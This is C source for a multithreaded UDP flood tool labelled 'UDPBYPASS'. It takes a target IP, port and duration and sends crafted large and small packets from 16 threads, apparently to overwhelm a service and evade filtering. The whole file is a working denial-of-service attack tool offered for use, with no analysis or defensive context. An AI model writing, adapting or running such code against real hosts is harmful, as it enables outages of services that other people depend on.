#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOAD 2056
#define THREADS 16
#define FLOOD_PKTS 10

unsigned char flood_payloads[FLOOD_PKTS][MAX_PAYLOAD];
unsigned char small_payloads[7][100] = {
    {0x84,0x9a,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69},
    {0x84,0xa0,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69},
    {0x84,0x8c,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69},
    {0x84,0x8a,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb7,0x1c},
    {0x84,0x88,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69},
    {0x84,0x87,0x00,0x00,0x40,0x00,0x48,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa2,0x69},
    {0x84,0x01,0x00,0x00,0x60,0x02,0xf0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x04}
};

void init_flood_payloads() {
    unsigned char base[] = {0x05,0x00,0xff,0xff,0x00,0xfe,0xfe,0xfe,0xfe,0xfd,0xfd,0xfd,0xfd,0x12,0x34,0x56,0x78,0x08};
    
    for(int i = 0; i < FLOOD_PKTS; i++) {
        memcpy(flood_payloads[i], base, 18);
        flood_payloads[i][18] = i;
        flood_payloads[i][19] = i*2;
        flood_payloads[i][20] = i*4;
        memset(flood_payloads[i] + 21, 0, MAX_PAYLOAD - 21);
    }
}

void* flood_thread(void* arg) {
    struct sockaddr_in target;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    char* ip = ((char**)arg)[0];
    int port = *(int*)((char**)arg)[1];
    
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    unsigned long long pkts = 0;
    while(*(int*)((char**)arg)[2] > 0) {
        if(rand() % 5 < 4) {
            int idx = rand() % FLOOD_PKTS;
            sendto(sock, flood_payloads[idx], MAX_PAYLOAD, 0, 
                   (struct sockaddr*)&target, sizeof(target));
        } else {
            int idx = rand() % 7;
            sendto(sock, small_payloads[idx], 20 + (idx*5), 0, 
                   (struct sockaddr*)&target, sizeof(target));
        }
        pkts++;
    }
    close(sock);
    printf("[+] Thread: %llu pkts\n", pkts);
    return NULL;
}

int main(int argc, char* argv[]) {
    if(argc != 4) {
        printf("%s <IP> <PORT> <TIME>\n", argv[0]);
        printf("Ej: %s 1.1.1.1 80 60\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("[+] UDPBYPASS\n");
    printf("[+] TargetIP: %s:%d x %ds | %d Threads\n", ip, port, duration, THREADS);
    
    srand(time(NULL));
    init_flood_payloads();
    
    pthread_t threads[THREADS];
    void* args[THREADS][3];
    
    int end_time = time(NULL) + duration;
    
    for(int i = 0; i < THREADS; i++) {
        args[i][0] = ip;
        args[i][1] = &port;
        args[i][2] = &end_time;
        pthread_create(&threads[i], NULL, flood_thread, args[i]);
    }
    
    sleep(duration);
    *(int*)args[0][2] = 0;
    
    for(int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("[+] Finished\n");
    return 0;
}
